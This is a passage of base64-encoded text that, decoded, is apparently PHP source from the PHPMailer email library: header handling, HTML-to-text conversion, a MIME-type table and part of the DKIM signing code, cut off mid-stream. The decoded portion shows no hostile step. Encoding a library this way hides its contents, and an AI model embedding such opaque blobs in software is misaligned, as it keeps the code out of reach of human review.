E1haWxlci93aWtpL1Ryb3VibGVzaG9vdGluZyc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICRrZXk7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlzRXJyb3IoKSB7DQogICAgICAgIHJldHVybiAoJHRoaXMtPmVycm9yX2NvdW50ID4gMCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBmaXhFT0woJHN0cikgew0KICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgIlxyXG4iLA0KICAgICAgICAgICAgIlxyIg0KICAgICAgICApLCAiXG4iLCAkc3RyKTsNCiAgICAgICAgaWYgKCR0aGlzLT5MRSAhPT0gIlxuIikgew0KICAgICAgICAgICAgJG5zdHIgPSBzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICRuc3RyKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJG5zdHI7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDdXN0b21IZWFkZXIoJG5hbWUsICR2YWx1ZSA9IG51bGwpIHsNCiAgICAgICAgaWYgKCR2YWx1ZSA9PT0gbnVsbCkgew0KICAgICAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gZXhwbG9kZSgnOicsICRuYW1lLCAyKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICRuYW1lLA0KICAgICAgICAgICAgICAgICR2YWx1ZQ0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q3VzdG9tSGVhZGVycygpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5DdXN0b21IZWFkZXI7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBtc2dIVE1MKCRtZXNzYWdlLCAkYmFzZWRpciA9ICcnLCAkYWR2YW5jZWQgPSBmYWxzZSkgew0KICAgICAgICBwcmVnX21hdGNoX2FsbCgnLyhzcmN8YmFja2dyb3VuZCk9WyJcJ10oLiopWyJcJ10vVWknLCAkbWVzc2FnZSwgJGltYWdlcyk7DQogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRpbWFnZXMpKSB7DQogICAgICAgICAgICBpZiAoc3RybGVuKCRiYXNlZGlyKSA+IDEgJiYgc3Vic3RyKCRiYXNlZGlyLCAtMSkgIT0gJy8nKSB7DQogICAgICAgICAgICAgICAgJGJhc2VkaXIgLj0gJy8nOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoJGltYWdlc1syXSBhcyAkaW1naW5kZXggPT4gJHVybCkgew0KICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcjXmRhdGE6KGltYWdlW147LF0qKSg7YmFzZTY0KT8sIycsICR1cmwsICRtYXRjaCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBzdWJzdHIoJHVybCwgc3RycG9zKCR1cmwsICcsJykpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJG1hdGNoWzJdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IGJhc2U2NF9kZWNvZGUoJGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSByYXd1cmxkZWNvZGUoJGRhdGEpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRjaWQgPSBtZDUoJHVybCkgLiAnQHBocG1haWxlci4wJzsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKCRkYXRhLCAkY2lkLCAnZW1iZWQnIC4gJGltZ2luZGV4LCAnYmFzZTY0JywgJG1hdGNoWzFdKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdHJfcmVwbGFjZSgkaW1hZ2VzWzBdWyRpbWdpbmRleF0sICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9ImNpZDonIC4gJGNpZCAuICciJywgJG1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRiYXNlZGlyKSAmJiAoc3RycG9zKCR1cmwsICcuLicpID09PSBmYWxzZSkgJiYgc3Vic3RyKCR1cmwsIDAsIDQpICE9PSAnY2lkOicgJiYgIXByZWdfbWF0Y2goJyNeW2Etel1bYS16MC05Ky4tXSo6Py8vI2knLCAkdXJsKSkgew0KICAgICAgICAgICAgICAgICAgICAkZmlsZW5hbWUgID0gYmFzZW5hbWUoJHVybCk7DQogICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSBkaXJuYW1lKCR1cmwpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJGRpcmVjdG9yeSA9PSAnLicpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSAnJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkY2lkID0gbWQ1KCR1cmwpIC4gJ0BwaHBtYWlsZXIuMCc7DQogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGRpcmVjdG9yeSkgPiAxICYmIHN1YnN0cigkZGlyZWN0b3J5LCAtMSkgIT0gJy8nKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGlyZWN0b3J5IC49ICcvJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoJGJhc2VkaXIgLiAkZGlyZWN0b3J5IC4gJGZpbGVuYW1lLCAkY2lkLCAkZmlsZW5hbWUsICdiYXNlNjQnLCBzZWxmOjpfbWltZV90eXBlcygoc3RyaW5nKSBzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSBwcmVnX3JlcGxhY2UoJy8nIC4gJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz1bIlwnXScgLiBwcmVnX3F1b3RlKCR1cmwsICcvJykgLiAnWyJcJ10vVWknLCAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPSJjaWQ6JyAuICRjaWQgLiAnIicsICRtZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+aXNIVE1MKHRydWUpOw0KICAgICAgICAkdGhpcy0+Qm9keSAgICA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJG1lc3NhZ2UpOw0KICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT5ub3JtYWxpemVCcmVha3MoJHRoaXMtPmh0bWwydGV4dCgkbWVzc2FnZSwgJGFkdmFuY2VkKSk7DQogICAgICAgIGlmICghJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5BbHRCb2R5ID0gJ1RvIHZpZXcgdGhpcyBlbWFpbCBtZXNzYWdlLCBvcGVuIGl0IGluIGEgcHJvZ3JhbSB0aGF0IHVuZGVyc3RhbmRzIEhUTUwhJyAuIHNlbGY6OkNSTEYgLiBzZWxmOjpDUkxGOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdGhpcy0+Qm9keTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGh0bWwydGV4dCgkaHRtbCwgJGFkdmFuY2VkID0gZmFsc2UpIHsNCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRhZHZhbmNlZCkpIHsNCiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkYWR2YW5jZWQsICRodG1sKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gaHRtbF9lbnRpdHlfZGVjb2RlKHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8c2NyaXB0KVtePl0qPi4qPzxcL1xcMT4vc2knLCAnJywgJGh0bWwpKSksIEVOVF9RVU9URVMsICR0aGlzLT5DaGFyU2V0KTsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBfbWltZV90eXBlcygkZXh0ID0gJycpIHsNCiAgICAgICAgJG1pbWVzID0gYXJyYXkoDQogICAgICAgICAgICAneGwnID0+ICdhcHBsaWNhdGlvbi9leGNlbCcsDQogICAgICAgICAgICAnanMnID0+ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JywNCiAgICAgICAgICAgICdocXgnID0+ICdhcHBsaWNhdGlvbi9tYWMtYmluaGV4NDAnLA0KICAgICAgICAgICAgJ2NwdCcgPT4gJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywNCiAgICAgICAgICAgICdiaW4nID0+ICdhcHBsaWNhdGlvbi9tYWNiaW5hcnknLA0KICAgICAgICAgICAgJ2RvYycgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsDQogICAgICAgICAgICAnd29yZCcgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsDQogICAgICAgICAgICAneGxzeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnNoZWV0JywNCiAgICAgICAgICAgICd4bHR4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwudGVtcGxhdGUnLA0KICAgICAgICAgICAgJ3BvdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwudGVtcGxhdGUnLA0KICAgICAgICAgICAgJ3Bwc3gnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGVzaG93JywNCiAgICAgICAgICAgICdwcHR4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnByZXNlbnRhdGlvbicsDQogICAgICAgICAgICAnc2xkeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZScsDQogICAgICAgICAgICAnZG9jeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLmRvY3VtZW50JywNCiAgICAgICAgICAgICdkb3R4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwudGVtcGxhdGUnLA0KICAgICAgICAgICAgJ3hsYW0nID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuYWRkaW4ubWFjcm9FbmFibGVkLjEyJywNCiAgICAgICAgICAgICd4bHNiJyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLnNoZWV0LmJpbmFyeS5tYWNyb0VuYWJsZWQuMTInLA0KICAgICAgICAgICAgJ2NsYXNzJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdkbGwnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2RtcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnZXhlJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdsaGEnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2x6aCcgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAncHNkJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdzZWEnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ3NvJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdvZGEnID0+ICdhcHBsaWNhdGlvbi9vZGEnLA0KICAgICAgICAgICAgJ3BkZicgPT4gJ2FwcGxpY2F0aW9uL3BkZicsDQogICAgICAgICAgICAnYWknID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywNCiAgICAgICAgICAgICdlcHMnID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywNCiAgICAgICAgICAgICdwcycgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLA0KICAgICAgICAgICAgJ3NtaScgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLA0KICAgICAgICAgICAgJ3NtaWwnID0+ICdhcHBsaWNhdGlvbi9zbWlsJywNCiAgICAgICAgICAgICdtaWYnID0+ICdhcHBsaWNhdGlvbi92bmQubWlmJywNCiAgICAgICAgICAgICd4bHMnID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLA0KICAgICAgICAgICAgJ3BwdCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1wb3dlcnBvaW50JywNCiAgICAgICAgICAgICd3YnhtbCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud2J4bWwnLA0KICAgICAgICAgICAgJ3dtbGMnID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLA0KICAgICAgICAgICAgJ2RjcicgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLA0KICAgICAgICAgICAgJ2RpcicgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLA0KICAgICAgICAgICAgJ2R4cicgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLA0KICAgICAgICAgICAgJ2R2aScgPT4gJ2FwcGxpY2F0aW9uL3gtZHZpJywNCiAgICAgICAgICAgICdndGFyJyA9PiAnYXBwbGljYXRpb24veC1ndGFyJywNCiAgICAgICAgICAgICdwaHAzJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLA0KICAgICAgICAgICAgJ3BocDQnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsDQogICAgICAgICAgICAncGhwJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLA0KICAgICAgICAgICAgJ3BodG1sJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLA0KICAgICAgICAgICAgJ3BocHMnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocC1zb3VyY2UnLA0KICAgICAgICAgICAgJ3N3ZicgPT4gJ2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywNCiAgICAgICAgICAgICdzaXQnID0+ICdhcHBsaWNhdGlvbi94LXN0dWZmaXQnLA0KICAgICAgICAgICAgJ3RhcicgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywNCiAgICAgICAgICAgICd0Z3onID0+ICdhcHBsaWNhdGlvbi94LXRhcicsDQogICAgICAgICAgICAneGh0JyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywNCiAgICAgICAgICAgICd4aHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3hodG1sK3htbCcsDQogICAgICAgICAgICAnemlwJyA9PiAnYXBwbGljYXRpb24vemlwJywNCiAgICAgICAgICAgICdtaWQnID0+ICdhdWRpby9taWRpJywNCiAgICAgICAgICAgICdtaWRpJyA9PiAnYXVkaW8vbWlkaScsDQogICAgICAgICAgICAnbXAyJyA9PiAnYXVkaW8vbXBlZycsDQogICAgICAgICAgICAnbXAzJyA9PiAnYXVkaW8vbXBlZycsDQogICAgICAgICAgICAnbXBnYScgPT4gJ2F1ZGlvL21wZWcnLA0KICAgICAgICAgICAgJ2FpZicgPT4gJ2F1ZGlvL3gtYWlmZicsDQogICAgICAgICAgICAnYWlmYycgPT4gJ2F1ZGlvL3gtYWlmZicsDQogICAgICAgICAgICAnYWlmZicgPT4gJ2F1ZGlvL3gtYWlmZicsDQogICAgICAgICAgICAncmFtJyA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8nLA0KICAgICAgICAgICAgJ3JtJyA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8nLA0KICAgICAgICAgICAgJ3JwbScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvLXBsdWdpbicsDQogICAgICAgICAgICAncmEnID0+ICdhdWRpby94LXJlYWxhdWRpbycsDQogICAgICAgICAgICAnd2F2JyA9PiAnYXVkaW8veC13YXYnLA0KICAgICAgICAgICAgJ2JtcCcgPT4gJ2ltYWdlL2JtcCcsDQogICAgICAgICAgICAnZ2lmJyA9PiAnaW1hZ2UvZ2lmJywNCiAgICAgICAgICAgICdqcGVnJyA9PiAnaW1hZ2UvanBlZycsDQogICAgICAgICAgICAnanBlJyA9PiAnaW1hZ2UvanBlZycsDQogICAgICAgICAgICAnanBnJyA9PiAnaW1hZ2UvanBlZycsDQogICAgICAgICAgICAncG5nJyA9PiAnaW1hZ2UvcG5nJywNCiAgICAgICAgICAgICd0aWZmJyA9PiAnaW1hZ2UvdGlmZicsDQogICAgICAgICAgICAndGlmJyA9PiAnaW1hZ2UvdGlmZicsDQogICAgICAgICAgICAnZW1sJyA9PiAnbWVzc2FnZS9yZmM4MjInLA0KICAgICAgICAgICAgJ2NzcycgPT4gJ3RleHQvY3NzJywNCiAgICAgICAgICAgICdodG1sJyA9PiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICdodG0nID0+ICd0ZXh0L2h0bWwnLA0KICAgICAgICAgICAgJ3NodG1sJyA9PiAndGV4dC9odG1sJywNCiAgICAgICAgICAgICdsb2cnID0+ICd0ZXh0L3BsYWluJywNCiAgICAgICAgICAgICd0ZXh0JyA9PiAndGV4dC9wbGFpbicsDQogICAgICAgICAgICAndHh0JyA9PiAndGV4dC9wbGFpbicsDQogICAgICAgICAgICAncnR4JyA9PiAndGV4dC9yaWNodGV4dCcsDQogICAgICAgICAgICAncnRmJyA9PiAndGV4dC9ydGYnLA0KICAgICAgICAgICAgJ3ZjZicgPT4gJ3RleHQvdmNhcmQnLA0KICAgICAgICAgICAgJ3ZjYXJkJyA9PiAndGV4dC92Y2FyZCcsDQogICAgICAgICAgICAneG1sJyA9PiAndGV4dC94bWwnLA0KICAgICAgICAgICAgJ3hzbCcgPT4gJ3RleHQveG1sJywNCiAgICAgICAgICAgICdtcGVnJyA9PiAndmlkZW8vbXBlZycsDQogICAgICAgICAgICAnbXBlJyA9PiAndmlkZW8vbXBlZycsDQogICAgICAgICAgICAnbXBnJyA9PiAndmlkZW8vbXBlZycsDQogICAgICAgICAgICAnbW92JyA9PiAndmlkZW8vcXVpY2t0aW1lJywNCiAgICAgICAgICAgICdxdCcgPT4gJ3ZpZGVvL3F1aWNrdGltZScsDQogICAgICAgICAgICAncnYnID0+ICd2aWRlby92bmQucm4tcmVhbHZpZGVvJywNCiAgICAgICAgICAgICdhdmknID0+ICd2aWRlby94LW1zdmlkZW8nLA0KICAgICAgICAgICAgJ21vdmllJyA9PiAndmlkZW8veC1zZ2ktbW92aWUnDQogICAgICAgICk7DQogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGV4dCksICRtaW1lcykpIHsNCiAgICAgICAgICAgIHJldHVybiAkbWltZXNbc3RydG9sb3dlcigkZXh0KV07DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSkgew0KICAgICAgICAkcXBvcyA9IHN0cnBvcygkZmlsZW5hbWUsICc/Jyk7DQogICAgICAgIGlmIChmYWxzZSAhPT0gJHFwb3MpIHsNCiAgICAgICAgICAgICRmaWxlbmFtZSA9IHN1YnN0cigkZmlsZW5hbWUsIDAsICRxcG9zKTsNCiAgICAgICAgfQ0KICAgICAgICAkcGF0aGluZm8gPSBzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUpOw0KICAgICAgICByZXR1cm4gc2VsZjo6X21pbWVfdHlwZXMoJHBhdGhpbmZvWydleHRlbnNpb24nXSk7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbWJfcGF0aGluZm8oJHBhdGgsICRvcHRpb25zID0gbnVsbCkgew0KICAgICAgICAkcmV0ICAgICAgPSBhcnJheSgNCiAgICAgICAgICAgICdkaXJuYW1lJyA9PiAnJywNCiAgICAgICAgICAgICdiYXNlbmFtZScgPT4gJycsDQogICAgICAgICAgICAnZXh0ZW5zaW9uJyA9PiAnJywNCiAgICAgICAgICAgICdmaWxlbmFtZScgPT4gJycNCiAgICAgICAgKTsNCiAgICAgICAgJHBhdGhpbmZvID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKHByZWdfbWF0Y2goJyVeKC4qPylbXFxcXC9dKigoW14vXFxcXF0qPykoXC4oW15cLlxcXFwvXSs/KXwpKVtcXFxcL1wuXSokJWltJywgJHBhdGgsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDEsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgICAgICAkcmV0WydkaXJuYW1lJ10gPSAkcGF0aGluZm9bMV07DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygyLCAkcGF0aGluZm8pKSB7DQogICAgICAgICAgICAgICAgJHJldFsnYmFzZW5hbWUnXSA9ICRwYXRoaW5mb1syXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDUsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgICAgICAkcmV0WydleHRlbnNpb24nXSA9ICRwYXRoaW5mb1s1XTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDMsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgICAgICAkcmV0WydmaWxlbmFtZSddID0gJHBhdGhpbmZvWzNdOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJG9wdGlvbnMpIHsNCiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRElSTkFNRToNCiAgICAgICAgICAgIGNhc2UgJ2Rpcm5hbWUnOg0KICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydkaXJuYW1lJ107DQogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0JBU0VOQU1FOg0KICAgICAgICAgICAgY2FzZSAnYmFzZW5hbWUnOg0KICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydiYXNlbmFtZSddOw0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19FWFRFTlNJT046DQogICAgICAgICAgICBjYXNlICdleHRlbnNpb24nOg0KICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydleHRlbnNpb24nXTsNCiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRklMRU5BTUU6DQogICAgICAgICAgICBjYXNlICdmaWxlbmFtZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2ZpbGVuYW1lJ107DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgIHJldHVybiAkcmV0Ow0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXQoJG5hbWUsICR2YWx1ZSA9ICcnKSB7DQogICAgICAgIGlmIChwcm9wZXJ0eV9leGlzdHMoJHRoaXMsICRuYW1lKSkgew0KICAgICAgICAgICAgJHRoaXMtPiRuYW1lID0gJHZhbHVlOw0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ3ZhcmlhYmxlX3NldCcpIC4gJG5hbWUpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZWN1cmVIZWFkZXIoJHN0cikgew0KICAgICAgICByZXR1cm4gdHJpbShzdHJfcmVwbGFjZShhcnJheSgNCiAgICAgICAgICAgICJcciIsDQogICAgICAgICAgICAiXG4iDQogICAgICAgICksICcnLCAkc3RyKSk7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbm9ybWFsaXplQnJlYWtzKCR0ZXh0LCAkYnJlYWt0eXBlID0gIlxyXG4iKSB7DQogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oXHJcbnxccnxcbikvbXMnLCAkYnJlYWt0eXBlLCAkdGV4dCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpIHsNCiAgICAgICAgJHRoaXMtPnNpZ25fY2VydF9maWxlICAgICAgID0gJGNlcnRfZmlsZW5hbWU7DQogICAgICAgICR0aGlzLT5zaWduX2tleV9maWxlICAgICAgICA9ICRrZXlfZmlsZW5hbWU7DQogICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzICAgICAgICA9ICRrZXlfcGFzczsNCiAgICAgICAgJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlID0gJGV4dHJhY2VydHNfZmlsZW5hbWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1FQKCR0eHQpIHsNCiAgICAgICAgJGxpbmUgPSAnJzsNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCR0eHQpOyAkaSsrKSB7DQogICAgICAgICAgICAkb3JkID0gb3JkKCR0eHRbJGldKTsNCiAgICAgICAgICAgIGlmICgoKDB4MjEgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHgzQSkpIHx8ICRvcmQgPT0gMHgzQyB8fCAoKDB4M0UgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHg3RSkpKSB7DQogICAgICAgICAgICAgICAgJGxpbmUgLj0gJHR4dFskaV07DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRsaW5lIC49ICc9JyAuIHNwcmludGYoJyUwMlgnLCAkb3JkKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGxpbmU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1NpZ24oJHNpZ25IZWFkZXIpIHsNCiAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICB9DQogICAgICAgICRwcml2S2V5U3RyID0gIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKSA/ICR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nIDogQGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5ES0lNX3ByaXZhdGUpOw0KICAgICAgICBpZiAoJycgIT0gJHRoaXMtPkRLSU1fcGFzc3BocmFzZSkgew0KICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIsICR0aGlzLT5ES0lNX3Bhc3NwaHJhc2UpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIpOw0KICAgICAgICB9DQogICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcpID49IDAgYW5kIGluX2FycmF5KCdzaGEyNTZXaXRoUlNBRW5jcnlwdGlvbicsIG9wZW5zc2xfZ2V0X21